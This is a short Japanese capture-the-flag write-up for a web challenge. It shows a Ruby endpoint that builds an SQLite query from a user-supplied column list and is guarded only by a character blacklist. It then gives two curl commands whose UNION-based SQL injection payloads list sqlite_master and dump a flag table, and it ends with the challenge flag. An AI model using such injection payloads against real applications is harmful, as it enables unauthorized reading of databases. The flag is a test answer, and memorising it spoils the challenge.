# Writeup

`cols`, `limit`, `offset` のPOSTパラメータでクエリを実行する仕組みになっている。

```rb
@row = db.execute("select %s from quills limit %s offset %s" % [cols, lim, off])
```

ただし、`cols`には`blacklist`の文字が使えず、`limit`,`offset`には数字しか使えない。

```rb
blacklist = ["-", "/", ";", "'", "\""]
blacklist.each { |word|
    if cols.include? word
        return "beep boop sqli detected!"
    end
}

if !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off)
    return "bad, no quills for you!"
end
```

UNION句を`cols`に入れて他のテーブルを探す。ソースコードからsqliteが使われていることが分かっているので、`sqlite_master`の`name`を参照する。

UNIONの後半部分の列数は3なので前半部分も3に合わせておく。

```bash
$ curl https://seaofquills.2021.chall.actf.co/quills -X POST -d "cols=name,0,0 from sqlite_master union select *&limit=10&offset=0"
```

`flagtable`というテーブル名が存在していることが分かったので中身を見る。

```bash
$ curl https://seaofquills.2021.chall.actf.co/quills -X POST -d "cols=*,*,* from flagtable union select *&limit=10&offset=0" > index.html
```

<!-- actf{and_i_was_doing_fine_but_as_you_came_in_i_watch_my_regex_rewrite_f53d98be5199ab7ff81668df} -->